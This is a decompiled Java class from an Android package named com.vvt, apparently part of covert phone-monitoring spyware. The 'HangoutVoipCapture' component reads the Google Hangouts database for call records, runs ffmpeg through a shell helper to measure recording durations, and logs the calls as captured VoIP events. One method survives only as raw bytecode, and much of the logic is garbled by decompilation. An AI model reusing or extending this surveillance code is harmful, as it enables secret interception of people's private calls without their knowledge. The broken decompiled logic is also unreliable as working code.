package com.vvt.al.b;

import android.os.SystemClock;
import com.vvt.io.p;
import com.vvt.shell.f;
import java.io.File;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class c
  extends com.vvt.al.a
  implements com.vvt.al.c
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  
  public c(String paramString1, String paramString2, com.vvt.h.d paramd, com.vvt.base.a parama)
  {
    super(paramString1, paramString2, parama);
  }
  
  /* Error */
  private void a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: getstatic 16	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   9: istore 6
    //   11: iload 6
    //   13: ifeq +3 -> 16
    //   16: aload_2
    //   17: invokestatic 31	com/vvt/capture/hangouts/d:removeFromPath	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   20: astore 7
    //   22: aload_0
    //   23: aload_3
    //   24: invokespecial 34	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(Ljava/lang/String;)Lcom/vvt/im/events/info/d;
    //   27: astore 8
    //   29: aload 7
    //   31: ifnull +187 -> 218
    //   34: aload 8
    //   36: ifnull +182 -> 218
    //   39: invokestatic 39	com/vvt/capture/hangouts/removeFromPath:a	()Ljava/lang/String;
    //   42: astore 9
    //   44: aconst_null
    //   45: astore 10
    //   47: aload 7
    //   49: aload 9
    //   51: aconst_null
    //   52: invokevirtual 45	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   55: astore 10
    //   57: aload 10
    //   59: ifnull +150 -> 209
    //   62: aload 8
    //   64: invokevirtual 49	com/vvt/im/events/info/d:removeFromPath	()Ljava/lang/String;
    //   67: astore 9
    //   69: aload 10
    //   71: aload 9
    //   73: invokestatic 52	com/vvt/capture/hangouts/removeFromPath:a	(Landroid/database/Cursor;Ljava/lang/String;)Ljava/util/ArrayList;
    //   76: astore 9
    //   78: aload 9
    //   80: invokevirtual 58	java/util/ArrayList:size	()I
    //   83: istore 11
    //   85: iload 11
    //   87: ifle +112 -> 199
    //   90: iconst_0
    //   91: istore 11
    //   93: aload 9
    //   95: iconst_0
    //   96: invokevirtual 62	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   99: astore 9
    //   101: aload 9
    //   103: checkcast 64	com/vvt/capture/hangouts/MyUncaughtExceptionHandler
    //   106: astore 9
    //   108: aload_0
    //   109: aload_1
    //   110: invokespecial 67	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:removeFromPath	(Ljava/lang/String;)I
    //   113: istore 4
    //   115: iload 4
    //   117: i2l
    //   118: lstore 12
    //   120: aload 9
    //   122: lload 12
    //   124: invokevirtual 70	com/vvt/capture/hangouts/MyUncaughtExceptionHandler:removeFromPath	(J)V
    //   127: aload 7
    //   129: ifnull +8 -> 137
    //   132: aload 7
    //   134: invokevirtual 74	android/database/sqlite/SQLiteDatabase:close	()V
    //   137: aload 10
    //   139: ifnull +10 -> 149
    //   142: aload 10
    //   144: invokeinterface 77 1 0
    //   149: aload 9
    //   151: ifnull +37 -> 188
    //   154: aload 8
    //   156: ifnull +32 -> 188
    //   159: aload_0
    //   160: aload 9
    //   162: invokevirtual 80	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/info/ICallLogData;)Z
    //   165: istore 4
    //   167: iload 4
    //   169: ifeq +160 -> 329
    //   172: getstatic 86	com/vvt/events/FxVoipCategory:GOOGLE_TALK	Lcom/vvt/events/FxVoipCategory;
    //   175: astore 5
    //   177: aload_0
    //   178: aload_1
    //   179: aload 9
    //   181: aload 8
    //   183: aload 5
    //   185: invokevirtual 89	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/info/ICallLogData;Lcom/vvt/im/events/info/d;Lcom/vvt/events/FxVoipCategory;)V
    //   188: getstatic 16	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   191: istore 6
    //   193: iload 6
    //   195: ifeq +3 -> 198
    //   198: return
    //   199: getstatic 21	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:d	Z
    //   202: istore 6
    //   204: iload 6
    //   206: ifeq +3 -> 209
    //   209: iconst_0
    //   210: istore 6
    //   212: aconst_null
    //   213: astore 9
    //   215: goto -88 -> 127
    //   218: getstatic 21	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:d	Z
    //   221: istore 6
    //   223: iload 6
    //   225: ifeq +3 -> 228
    //   228: iconst_0
    //   229: istore 6
    //   231: aconst_null
    //   232: astore 9
    //   234: aconst_null
    //   235: astore 10
    //   237: goto -110 -> 127
    //   240: astore 9
    //   242: iconst_0
    //   243: istore 6
    //   245: aconst_null
    //   246: astore 9
    //   248: aconst_null
    //   249: astore 8
    //   251: aconst_null
    //   252: astore 10
    //   254: getstatic 21	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:d	Z
    //   257: istore 14
    //   259: iload 14
    //   261: ifeq +3 -> 264
    //   264: aload 10
    //   266: ifnull +8 -> 274
    //   269: aload 10
    //   271: invokevirtual 74	android/database/sqlite/SQLiteDatabase:close	()V
    //   274: aload 8
    //   276: ifnull +10 -> 286
    //   279: aload 8
    //   281: invokeinterface 77 1 0
    //   286: aload 5
    //   288: astore 8
    //   290: goto -141 -> 149
    //   293: astore 9
    //   295: aconst_null
    //   296: astore 10
    //   298: iconst_0
    //   299: istore 14
    //   301: aconst_null
    //   302: astore 7
    //   304: aload 7
    //   306: ifnull +8 -> 314
    //   309: aload 7
    //   311: invokevirtual 74	android/database/sqlite/SQLiteDatabase:close	()V
    //   314: aload 10
    //   316: ifnull +10 -> 326
    //   319: aload 10
    //   321: invokeinterface 77 1 0
    //   326: aload 9
    //   328: athrow
    //   329: getstatic 16	com/vvt/al/removeFromPath/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   332: istore 6
    //   334: iload 6
    //   336: ifeq +3 -> 339
    //   339: aload_1
    //   340: invokestatic 95	com/vvt/shell/ShellUtil:i	(Ljava/lang/String;)V
    //   343: goto -155 -> 188
    //   346: astore 9
    //   348: aconst_null
    //   349: astore 10
    //   351: goto -47 -> 304
    //   354: astore 9
    //   356: goto -52 -> 304
    //   359: astore 9
    //   361: aload 10
    //   363: astore 7
    //   365: aload 8
    //   367: astore 10
    //   369: goto -65 -> 304
    //   372: astore 9
    //   374: iconst_0
    //   375: istore 6
    //   377: aconst_null
    //   378: astore 9
    //   380: aconst_null
    //   381: astore 8
    //   383: aload 7
    //   385: astore 10
    //   387: goto -133 -> 254
    //   390: astore 9
    //   392: iconst_0
    //   393: istore 6
    //   395: aconst_null
    //   396: astore 9
    //   398: aload 7
    //   400: astore 10
    //   402: aload 8
    //   404: astore 5
    //   406: aconst_null
    //   407: astore 8
    //   409: goto -155 -> 254
    //   412: astore 9
    //   414: iconst_0
    //   415: istore 6
    //   417: aconst_null
    //   418: astore 9
    //   420: aload 8
    //   422: astore 5
    //   424: aload 10
    //   426: astore 8
    //   428: aload 7
    //   430: astore 10
    //   432: goto -178 -> 254
    //   435: astore 5
    //   437: aload 8
    //   439: astore 5
    //   441: aload 10
    //   443: astore 8
    //   445: aload 7
    //   447: astore 10
    //   449: goto -195 -> 254
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	452	0	this	MyUncaughtExceptionHandler
    //   0	452	1	paramString1	String
    //   0	452	2	paramString2	String
    //   0	452	3	paramString3	String
    //   1	115	4	i	int
    //   165	3	4	bool1	boolean
    //   4	419	5	localObject1	Object
    //   435	1	5	localException1	Exception
    //   439	1	5	localObject2	Object
    //   9	407	6	bool2	boolean
    //   20	426	7	localObject3	Object
    //   27	417	8	localObject4	Object
    //   42	191	9	localObject5	Object
    //   240	1	9	localException2	Exception
    //   246	1	9	localObject6	Object
    //   293	34	9	localObject7	Object
    //   346	1	9	localObject8	Object
    //   354	1	9	localObject9	Object
    //   359	1	9	localObject10	Object
    //   372	1	9	localException3	Exception
    //   378	1	9	localObject11	Object
    //   390	1	9	localException4	Exception
    //   396	1	9	localObject12	Object
    //   412	1	9	localException5	Exception
    //   418	1	9	localObject13	Object
    //   45	403	10	localObject14	Object
    //   83	9	11	j	int
    //   118	5	12	l	long
    //   257	43	14	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   16	20	240	java/lang/Exception
    //   16	20	293	finally
    //   23	27	346	finally
    //   39	42	346	finally
    //   51	55	346	finally
    //   218	221	346	finally
    //   62	67	354	finally
    //   71	76	354	finally
    //   78	83	354	finally
    //   95	99	354	finally
    //   101	106	354	finally
    //   109	113	354	finally
    //   122	127	354	finally
    //   199	202	354	finally
    //   254	257	359	finally
    //   23	27	372	java/lang/Exception
    //   39	42	390	java/lang/Exception
    //   51	55	390	java/lang/Exception
    //   218	221	390	java/lang/Exception
    //   62	67	412	java/lang/Exception
    //   71	76	412	java/lang/Exception
    //   78	83	412	java/lang/Exception
    //   95	99	412	java/lang/Exception
    //   101	106	412	java/lang/Exception
    //   199	202	412	java/lang/Exception
    //   109	113	435	java/lang/Exception
    //   122	127	435	java/lang/Exception
  }
  
  private int b(String paramString)
  {
    int i = 1;
    boolean bool1 = c;
    if (bool1) {}
    Object localObject1 = p.a(this.b, "ffmpeg");
    bool1 = false;
    f localf = null;
    label355:
    for (;;)
    {
      try
      {
        Object localObject2 = new java/io/File;
        ((File)localObject2).<init>(paramString);
        boolean bool2 = ((File)localObject2).exists();
        boolean bool4;
        if (bool2)
        {
          int k = ((File)localObject2).canRead();
          if (k != 0)
          {
            k = c;
            if (k != 0) {}
            localObject2 = "%s -i %s";
            int j = 2;
            Object localObject3 = new Object[j];
            int n = 0;
            String str = null;
            localObject3[0] = localObject1;
            bool4 = true;
            localObject3[bool4] = paramString;
            localObject1 = String.format((String)localObject2, (Object[])localObject3);
            localf = f.a();
            localObject1 = localf.a((String)localObject1);
            k = c;
            if (k != 0) {}
            localObject2 = "[D|d]uration: (\\d\\d):(\\d\\d):(\\d\\d).(\\d\\d)";
            localObject2 = Pattern.compile((String)localObject2);
            localObject1 = ((Pattern)localObject2).matcher((CharSequence)localObject1);
            k = ((Matcher)localObject1).find();
            if (k == 0) {
              break label355;
            }
            k = c;
            if (k != 0) {}
            k = 1;
            localObject2 = ((Matcher)localObject1).group(k);
            int m = a((String)localObject2);
            j = 2;
            localObject3 = ((Matcher)localObject1).group(j);
            j = a((String)localObject3);
            n = 3;
            str = ((Matcher)localObject1).group(n);
            i = a(str);
            j *= 60;
            i += j;
            m = m * 60 * 60;
            i += m;
            bool3 = c;
            if (!bool3) {
              continue;
            }
            continue;
          }
        }
        boolean bool3 = c;
        if (bool3) {}
        paramString = com.vvt.io.d.h(paramString);
        bool3 = c;
        if (bool3)
        {
          continue;
          if (localf == null) {}
        }
      }
      catch (Exception localException)
      {
        bool4 = d;
        if ((!bool4) || (localf != null)) {
          localf.d();
        }
        bool1 = c;
        if (bool1) {}
        return i;
      }
      finally
      {
        if (localf != null) {
          localf.d();
        }
      }
    }
  }
  
  private com.vvt.im.events.info.d c(String paramString)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = c;
    if (bool2) {}
    Object localObject2 = c();
    localObject2 = com.vvt.capture.hangouts.d.a(null, (String)localObject2, paramString);
    String str = ((com.vvt.im.events.info.d)localObject2).b();
    boolean bool3 = com.vvt.ag.b.a(str);
    if (bool3) {}
    for (;;)
    {
      bool2 = c;
      if (bool2) {}
      return (com.vvt.im.events.info.d)localObject1;
      bool1 = c;
      if (bool1) {}
      localObject1 = localObject2;
    }
  }
  
  private e f()
  {
    boolean bool1 = c;
    if (bool1) {}
    e locale = new com/vvt/al/b/e;
    boolean bool2 = false;
    locale.<init>(this, null);
    String str1 = com.vvt.n.a.b.b.b();
    boolean bool3 = com.vvt.ag.b.a(str1);
    if (!bool3)
    {
      bool3 = c;
      if (bool3) {}
      String str2 = c();
      String str3 = e();
      String str4 = this.a;
      str1 = com.vvt.capture.hangouts.c.c.b(str1, str4, str2, str3);
      boolean bool4 = c;
      if (bool4) {}
      str4 = com.vvt.n.a.b.b.a(str1);
      boolean bool5 = c;
      if ((!bool5) || (str4 != null))
      {
        String str5 = this.a;
        str2 = com.vvt.capture.hangouts.c.c.a(str4, str5, str2, str3);
        boolean bool6 = c;
        if (bool6) {}
        bool6 = true;
        locale.a = bool6;
        locale.b = str1;
        locale.c = str2;
      }
    }
    for (;;)
    {
      bool2 = c;
      if (bool2) {}
      return locale;
      locale.a = false;
      continue;
      bool2 = d;
      if (bool2) {}
      locale.a = false;
    }
  }
  
  public int a(String paramString)
  {
    return Integer.parseInt(paramString.replaceAll("[\\D]", ""));
  }
  
  public String a()
  {
    return "voip_line";
  }
  
  public void a(String paramString, long paramLong)
  {
    boolean bool1 = c;
    if (bool1) {}
    bool1 = c;
    if (bool1) {}
    long l = 10000L;
    SystemClock.sleep(l);
    Object localObject = f();
    boolean bool2 = ((e)localObject).a;
    if (bool2)
    {
      String str = ((e)localObject).c;
      localObject = ((e)localObject).b;
      a(paramString, str, (String)localObject);
    }
    d();
    bool1 = c;
    if (bool1) {}
  }
  
  public String b()
  {
    return "HangoutVoipCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */